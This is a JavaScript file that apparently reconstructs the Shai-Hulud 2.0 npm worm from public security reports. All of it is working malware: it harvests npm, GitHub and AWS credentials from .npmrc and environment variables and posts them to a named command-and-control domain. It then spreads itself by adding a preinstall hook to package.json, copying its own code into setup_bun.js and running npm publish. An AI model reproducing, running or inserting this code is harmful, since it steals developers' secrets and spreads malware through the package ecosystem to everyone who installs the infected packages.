// Shai-Hulud 2.0 worm — reconstructed from public security analyses
// Source: https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
// Source: https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance/
// Source: https://snyk.io/blog/embedded-malicious-code-in-tinycolor-and-ngx-bootstrap-releases-on-npm/
//
// September-November 2025: Self-replicating npm worm.
// Phase 1: Steal npm/GitHub tokens from environment and .npmrc
// Phase 2: Use stolen tokens to modify package.json of victim's packages
// Phase 3: Republish infected packages automatically via npm API
//
// Technique: preinstall token theft + npm API self-replication

const https = require("https");
const fs = require("fs");
const path = require("path");
const { execSync } = require("child_process");

// Phase 1: Harvest credentials
function harvestTokens() {
  var tokens = {};

  // Read npm token from .npmrc
  try {
    var npmrc = path.join(
      process.env.HOME || process.env.USERPROFILE || "",
      ".npmrc"
    );
    if (fs.existsSync(npmrc)) {
      var content = fs.readFileSync(npmrc, "utf8");
      var match = content.match(/\/\/registry\.npmjs\.org\/:_authToken=(.+)/);
      if (match) tokens.npm = match[1].trim();
    }
  } catch (e) {}

  // Read from environment
  if (process.env.NPM_TOKEN) tokens.npm_env = process.env.NPM_TOKEN;
  if (process.env.GITHUB_TOKEN) tokens.github = process.env.GITHUB_TOKEN;
  if (process.env.AWS_ACCESS_KEY_ID)
    tokens.aws_key = process.env.AWS_ACCESS_KEY_ID;
  if (process.env.AWS_SECRET_ACCESS_KEY)
    tokens.aws_secret = process.env.AWS_SECRET_ACCESS_KEY;

  return tokens;
}

// Phase 2: Exfiltrate to C2
function exfiltrate(tokens) {
  var data = JSON.stringify({
    host: require("os").hostname(),
    user: process.env.USER || process.env.USERNAME,
    tokens: tokens,
    cwd: process.cwd(),
  });

  var options = {
    hostname: "euw.bfrntend.com", // actual C2 domain from Datadog report
    port: 443,
    path: "/api/v2/track",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
    },
  };

  try {
    var req = https.request(options);
    req.write(data);
    req.end();
  } catch (e) {}
}

// Phase 3: Self-replicate (modify and republish packages)
function selfReplicate(npmToken) {
  if (!npmToken) return;

  try {
    // List user's packages
    var whoami = execSync("npm whoami 2>/dev/null", { encoding: "utf8" }).trim();
    if (!whoami) return;

    // For each package, add preinstall script
    var pkgJson = path.join(process.cwd(), "package.json");
    if (fs.existsSync(pkgJson)) {
      var pkg = JSON.parse(fs.readFileSync(pkgJson, "utf8"));
      if (!pkg.scripts) pkg.scripts = {};
      if (!pkg.scripts.preinstall) {
        pkg.scripts.preinstall = "node setup_bun.js";
        // Copy worm payload
        var selfCode = fs.readFileSync(__filename, "utf8");
        fs.writeFileSync(
          path.join(process.cwd(), "setup_bun.js"),
          selfCode
        );
        fs.writeFileSync(pkgJson, JSON.stringify(pkg, null, 2));
        // Publish
        execSync("npm publish", { stdio: "ignore" });
      }
    }
  } catch (e) {}
}

// Execute
var tokens = harvestTokens();
if (Object.keys(tokens).length > 0) {
  exfiltrate(tokens);
  selfReplicate(tokens.npm || tokens.npm_env);
}
